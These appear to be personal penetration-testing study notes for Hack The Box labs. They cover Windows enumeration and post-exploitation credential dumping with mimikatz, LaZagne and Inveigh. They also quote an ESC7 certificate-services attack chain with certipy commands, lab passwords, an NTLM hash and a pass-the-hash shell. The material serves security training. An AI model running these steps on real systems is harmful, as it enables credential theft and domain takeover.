# Situational Awareness
## Network Information
Interface(s), IP Address(es), DNS Information
```
C:\htb> ipconfig /all
```
ARP Table
```
C:\htb> arp -a
```
Routing Table
```
C:\htb> route print
```
## Check Windows Defender Status
```
PS C:\htb> Get-MpComputerStatus
```
## List AppLocker Rules
```
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
## Test AppLocker Policy
```
PS C:\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```
# Initial Enumeration
## Tasklist
```
C:\htb> tasklist /svc
```
standard Windows processes such as Session Manager Subsystem (smss.exe), Client Server Runtime Subsystem (csrss.exe), WinLogon (winlogon.exe), Local Security Authority Subsystem Service (LSASS), and Service Host (svchost.exe
## Display All Environment Variables
```
C:\htb> set
```
## View Detailed Configuration Information
```
C:\htb> systeminfo
```
The systeminfo command will show if the box has been patched recently and if it is a VM. If the box has not been patched recently, getting administrator-level access may be as simple as running a known exploit. Google the KBs installed under HotFixes to get an idea of when the box has been patched. This information isn't always present, as it is possible to hide hotfixes software from non-administrators. 
## Patches and Updates
### cmd
```
C:\htb> wmic qfe
```
### PowerShell 
```
PS C:\htb> Get-HotFix | ft -AutoSize
```
## Installed Programs
### cmd
```
C:\htb> wmic product get name
```
### PowerShell 
```
PS C:\htb> Get-WmiObject -Class Win32_Product |  select Name, Version
```
## Display Running Processes
```
PS C:\htb> netstat -ano
```
## User & Group Information
### Logged-In Users
```
C:\htb> query user
```
### Current User
```
C:\htb> echo %USERNAME%
```
### Current User Privileges
```
C:\htb> whoami /priv
```
### Current User Group Information
```
C:\htb> whoami /groups
```
### Get All Users
```
C:\htb> net user
```
### Get All Groups
```
C:\htb> net localgroup
```
### Details About a Group
```
C:\htb> net localgroup administrators
```
### Get Password Policy & Other Account Information
```
C:\htb> net accounts
```
# Communication with Processes
## Enumerating Network Services
### Display Active Network Connections
```
C:\htb> netstat -ano
```
The main thing to look for with Active Network Connections are entries listening on loopback addresses (127.0.0.1 and ::1) that are not listening on the IP Address (10.129.43.8) or broadcast (0.0.0.0, ::/0). 
The one that sticks out immediately will be port 14147, which is used for FileZilla's administrative interface. By connecting to this port, it may be possible to extract FTP passwords in addition to creating an FTP Share at c:\ as the FileZilla Server user (potentially Administrator).
## Named Pipes
Pipes are used for communication between two applications or processes using shared memory. There are two types of pipes, named pipes and anonymous pipes. An example of a named pipe is `\\.\PipeName\\ExampleNamedPipeServer`
### Listing Named Pipes with Pipelist
```
C:\htb> pipelist.exe /accepteula
```
### Listing Named Pipes with PowerShell
```
PS C:\htb>  gci \\.\pipe\
```
### Reviewing LSASS Named Pipe Permissions
```
C:\htb> accesschk.exe /accepteula \\.\Pipe\lsass -v
```
Named Pipes Attack Example
### Checking WindscribeService Named Pipe Permissions
```
C:\htb> accesschk.exe -accepteula -w \pipe\WindscribeService -v
```
# Active Directory Considerations
Once you escelated your privileges especially on a Host that is NOT a domain controller but an object in the domain
## Post-Exploitation/Pillaging
```
c:\Users\ilfserveradm\Documents> mimikatz.exe
```
```
mimikatz # privilege::debug
```
```
Privilege '20' OK
```
```
mimikatz # lsadump::secrets
```
1. We find a set password but no associated username. This appears to be for an account configured with autologon, so we can query the Registry to find the username
```
PS C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
```
2. We see Firefox installed, so we can grab the LaZagne tool to try to dump any credentials saved in the browser.
```
c:\Users\ilfserveradm\Documents> lazagne.exe browsers -firefox
```
3. It's also worth running Inveigh once we have local admin on a host to see if we can obtain password hashes for any users.
```
PS C:\Users\ilfserveradm\Documents> Import-Module .\Inveigh.ps1
```
```
PS C:\Users\ilfserveradm\Documents> Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```
## If you have a session on a DC host machine
### ADCS
It’s worth checking Advice Directory Certificate Services (ADCS) as well, and that’s quick, so I’ll start there. This can be done by uploading Certify or remotely with Certipy. I find Certipy easier.
```
https://github.com/ly4k/Certipy
```
```
oxdf@hacky$ certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```
```
ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
```
### ESC7
```
https://0xdf.gitlab.io/2024/03/16/htb-manager.html
```
#### Add Manage Certificates
ESC7 is when a user has either the “Manage CA” or “Manage Certificates” access rights on the certificate authority itself. Raven has ManageCa rights (shown in the output above).
The steps to exploit this are on the Certipy README.
First, I’ll need to use the Manage CA permission to give Raven the Manage Certificates permission:
```
oxdf@hacky$ certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
Now Raven shows up there where they didn’t before:
```
oxdf@hacky$ certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```
#### Administrator Certificate
The first step is to request a certificate based on the Subordinate Certification Authority (SubCA) template provided by ADCS. The SubCA template serves as a predefined set of configurations and policies governing the issuance of certificates.
```
oxdf@hacky$ certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
```
Would you like to save the private key? (y/N) y
[*] Saved private key to 13.key
```
This fails, but it saves the private key involved. Then, using the Manage CA and Manage Certificates privileges, I’ll use the ca subcommand to issue the request:
```
oxdf@hacky$ certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
Now, the issued certificate can be retrieved using the req command:
```
oxdf@hacky$ certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
```
[*] Rerieving certificate with ID 13          
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '13.key'                     
[*] Saved certificate and private key to 'administrator.pfx'
```
With this certificate as the administrator user, the easiest way to get a shell is to use it to get the NTLM hash for the user with the auth command. This requires the VM and target times to be in sync, with otherwise leads to this failure:
```
oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip manager.htb
```
I’ll use ntpdate to sync my VM’s time to Manager’s:
```
oxdf@hacky$ sudo ntpdate 10.10.11.236
```
```
oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236 
```
With the hash, I can get a shell as administrator using Evil-WinRM:
```
oxdf@hacky$ evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
```